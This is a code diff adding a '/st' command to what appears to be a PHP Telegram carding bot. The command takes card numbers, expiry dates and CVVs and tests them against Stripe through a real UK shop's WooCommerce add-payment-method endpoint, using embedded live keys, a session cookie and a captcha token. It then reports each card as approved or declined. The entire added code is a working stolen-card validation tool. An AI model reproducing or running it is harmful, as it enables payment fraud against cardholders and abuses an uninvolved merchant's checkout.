@@ -2104,6 +2104,173 @@ ob_flush();
 
 /////GATES AUTH////
 
+
+
+elseif((strpos($message, "!st") === 0)||(strpos($message, "/st") === 0)||(strpos($message, ".st") === 0)){
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+
+$lista = "$cc|$mes|$ano|cvv";
+
+
+$bin = substr($lista, 0, 6);
+$num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//
+
+
+//Verifi//
+if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+    $respuesta = "🚫 Oops!\nUse this format: /st CC|MM|YYYY|CVV\n";
+    sendMessage($chat_id, $respuesta, $message_id);
+    die();
+}
+
+
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+$longitud = 4;
+$partes = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;
+}
+
+////EXTRAE EL NONCE////
+$cc = implode('+', $partes);
+
+$curl = curl_init();                                                                    
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=+&billing_details%5Bemail%5D=tataji3523%40vatatire.com&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fc44ca35285%3B+stripe-js-v3%2Fc44ca35285%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fstainlessnutsandbolts.co.uk&time_on_page=41675&client_attribution_metadata%5Bclient_session_id%5D=d8a04382-0fa4-47eb-84b7-8f3dddf4581a&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1QmxFeC6CRNjGWbA&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUzQ3SjBUbXhnMVVCd3FpYnp0bVZySGtJSlI2aVA2RnRGQUtqSWFyYi9uQlcwRlJUMFdEQmFJWWRFQXBVWWJBZTdqREZNUDBvalhoQlJpYXQvQUErOEgzRmhLdEZPaXFJL1QxV2NUMEJvaGQwS1ZHRE5pd0hDNmkwYU1hSWFGNm1VQWtTMWpLNHkvcHQ3RmdoUDJpSFF1SjVTYWltYWtKcklqMU9GY3hVbWx4Nzd2UEhFNzR6SisxeHNrWDliT1luS1JtN1VTUWdiekVKUzVibndad1VRSGpiZTNpdHd4d2xOeE1IbTBEbUs1V3dYdEc0cmRGWEtiNytiVHNUblJweXpRMCt0S2VrUkY2MGRlcC9tSWJzZ3RlZmYzdXFMYkdjQTlyZXArQkxIKzJPWE1vb0dLVGo4KzB6V2FwRXN5cDFPcnJFcmI3TW1mdnNmbExUc0locUNlSVg1OGtHRlNDdFR3eFB4OEQrMzhFM0d1c2hnR05SNHlyc1QwNHNOQjBlZTQwQmxVbFNDK3ZKVU42YmVOeXpycTUxREdKOEJxdWN0RDd0NWRMZHNSYkc0bzlQa0Rzb1FRV3BEaG5lU2wveERCZUswekE3MlRuVUx3bU9JZFpuRDhzQkJWWjJ6bUw2MHJZRzNwbkVxc0pKK1ZMY2NwWW02aWVqT2FJejQyWnRSbUMzUStQaE5ocDFFZlUwaWhkREI4THdVcHZ6b1lEZ2RuNzIvb0VSNGNqdEp5UXdia3ZpRCtZK1RPWkJUMnI1WWQ2YW05NXNacGt1eThvbndrSVBUR1h2OWxlZUVBamxONWRFQkxLbHpqMWVhVjJqMk1RNTBGMURoSEJqOERzUzRiUHIyTUJaMVAwbC9LTzJCOEl6WXRjVDFrQlN6ekQzb3A2dkNpeG91Qmt5eXRsTkptV1VicytHdGVlS1pmS0JsMThsNjFLL2d0a0VZT2VWaG96K3QxSEVoT0VYamVhWWZUWnhBdU5xd0x4S1ZMOGxwZFZpMGJTMUhFbzd3dGZnT25KTURCUVdDMEp5aWh6Q0ptSnU2SGZLK3hoZzd4d1VtR1dwbEJNcE1YWllwYlFOOUY1ZHYwUFllSTdmWGFwb29hTGtnbFhxdGtlYmNUcWNYS0FQVFNtT01hT24wbU5wdSt3ZmlEeUhMUVpibmdSQkRQWGRmMkM5eFVFUTh4K1gwbnFEYUxqd2R6enhzWjFTZVNMUGVFZGprT0pNM0xiWjNsQ3lnNCtyYWhEcTlBQ3JreFJHdnNNMnc1dUZCY2RudmpRbmZiY2grS1dhUkNneHpodGJzY2Qwdm9McFc4NHRMZHVHS2Nwb3FyY1BDdnJydnFHaXJ6NjhVcDJBalltVVNhbEI2VHNNejkwZ2JMaTBrSXlDbnY0Y2pLdjN2eHlWc2FjQUNWUndOSzB6YmRRZ2lPcmowK3crY0pNdHh2SmRjdVROTUV0VDIzVFlPS2x4VDhWb3pUZjhITjlMbW5MVW1QbmRYbm5Hd2ZMOGMwa3BwR21HcU5iN2NveU9ZVHMyYkVhTjNFaW1ackhFZFJVMVJHaXZSeFlyMUhCU2FQODBWT2IwaWVVUUVtNVRSOEUzRDdDZTFYY0NnZmQzK1dJendzTW12SHhVMkd0b0VOYXpkd21rZzdsWWdsR0tRRnZna21uaXZQWDUvaXJwSXFldmhRMVU4NHMvb05tTFlSYVlEcjU5MzFIWEJ5REVsd0FOVXBGa3BtTzBFMTUzVEZXbHpRVHZYU3Jhb3Q4ays4V0VieWhDc2c4S2NiYWZKZHI0MWNzSHlJbGZKNm9GOXV2b1V4bWF1S2RYUURxRU5PbGpRN1FaSWVrOThOZ1p5OGJhbFRNVVlnUitnc2d1Y1lkdWJqSHYvSEYvS3BNaXBqN3g2eEFRZGM2bXpoenBmTHRTbjZQV0RFN1N1U1cwYnc2UzZ4NEFDK0lrSjdQcllkcUJvK3d2dnhNTzBrVm82aWxPdmVUUVNIVzVRcERtNk1kSkFqWEk2RFNrbXZYcXZGcGJSc2UxbVRBYjNJbGRiZGI5Ykh1K3V3QXo5T3pCeEFlbWdZdHhoOEtjUjZZYXpRTTlCOVpXM0ZwczZNRXcrRU5UbitOTmVrTjFseFBiSUVYY0hIY2JsZVJOUnhnNVdhL3RSc0FCUCtCVWN0djVXWW9qV2IzaXpJOHZ2VWtUTzhId3hnaFlVUGpLcnM5OGltRHh5RzM1aldpemFHOFRrd202Sm1mZFF6Qm82Rm8rNnJOL2ZsOVZ4bmJkMnhkZ3B0aHFRZXNYeS9ERHVNSjJOQnlRcFU0Z2tldmtobWRNYnNycm1sdmVZbzEwQmxkL2tkMEU3NW0vVFAxMm9Ob1I4UnRscEcwN2RPN2tvZ3lEb29BMlNkQUlPc3hrT2dicVBBb0dSSkE1aUh2UmVFZUZDZStNcWVBSmdCNisyc3dsZ3hoWldCb0VjS2hTTGRBUXlqREVXS3dHQ2VwZm9YL3lqcE85cjljZEcrTXRjY2JwQ2JtL3lpdXM4dHVTR2srSEVMNTY5ZXB5Rm9hTVdUZEYzbkJBWWhmMG1LWS9UYTNURHFTN0hSaGxJNUUzSC9TejhKSkxHN0Q4QzlBcm9HMWZReGcxbWZLaXBJbnVLN0prQ1FURUd4bVZGWXE4UzdETTdwQ2RGYjg1dzlBVUl2c3FFczBJU2c5YlhrRzIrdFpBMm51ZlBONlNzWHB3Rmh6N1k1TC85UWlBMm5VPSIsImV4cCI6MTc0MTg4NTgxMiwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIxMDU2ZjA3MSIsInBkIjowLCJjZGF0YSI6InpyM25DY3dyMHFGZVByYWJISFJHaFQ2SlR3N1FFS2VUYS9pTzVHUyttdHg4VFc4eGNad2s2MTk5cXNubU1EZnRvUjJIbnA1aFdoamNuZ296Zi9hVWF0Y2tNZnJBaHYxdTFuVjVXOU9JOUVhNURWNDRKOTVHZHlHNFc0c2RrdDYxZm1NT0YyejdtZzl3WlBiUmY1TUt4NXJPUUI3VXNyYUcxdWJudnN6UVdLTTVaVjg3UW4xTDg0aEUvNHovUTMrSnQ1aWhsSEdFWS8rM3BKRXMifQ.WJqabVddYBINxRZM2XnLETh1nA4YgYHJRMSdkFzzC18',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.7',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$json = json_decode($response, true);
+$id = $json["id"];
+curl_close($curl);
+echo "$id\n";
+
+
+
+
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://stainlessnutsandbolts.co.uk/wp-admin/admin-ajax.php',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => [
+    'action' => 'create_setup_intent',
+    'wcpay-payment-method' => ''.$id.'',
+    '_ajax_nonce' => 'bc1c31483f',
+  ],
+  CURLOPT_COOKIE => 'wordpress_sec_3dc49451096e94637e98b7d302410bbe=tataji3523%7C1743095179%7C6ykFKTmQOiQ8TVaZQ08uhYAymLk9M7zTVate4fls0E3%7C4d04ba1c80d1fb76591327d6f56bb7ad385e7a75384526499dacb690aabc850e; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3dc49451096e94637e98b7d302410bbe=tataji3523%7C1743095179%7C6ykFKTmQOiQ8TVaZQ08uhYAymLk9M7zTVate4fls0E3%7C3800628016aa866c6fcc02818d9bc626224a03f58f175ef9036dd2b3b063bdc6; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryDRNCeIhrpZ14Xo0P',
+    'accept-language: es-US,es;q=0.7',
+    'origin: https://stainlessnutsandbolts.co.uk',
+    'referer: https://stainlessnutsandbolts.co.uk/my-account/add-payment-method/',
+    'priority: u=1, i',
+  ],
+]);
+	
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$message = str_replace("Error: ", "", $json['data']['error']['message']);
+$success = $json['success'];
+$status = $json['data']['status'];
+curl_close($curl);
+
+if ($success === true && $status === "succeeded") {
+    $respo = "1000: Approved!";
+
+} elseif ($success === true && $status === "requires_action") {
+    $respo = "3DS Authenticate Rejected ❌";
+} else {
+    $respo = $message;
+}
+
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+}
+	
+
+
+
+
+
+	
+
 elseif((strpos($message, "!wo") === 0)||(strpos($message, "/wo") === 0)||(strpos($message, ".wo") === 0)){
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
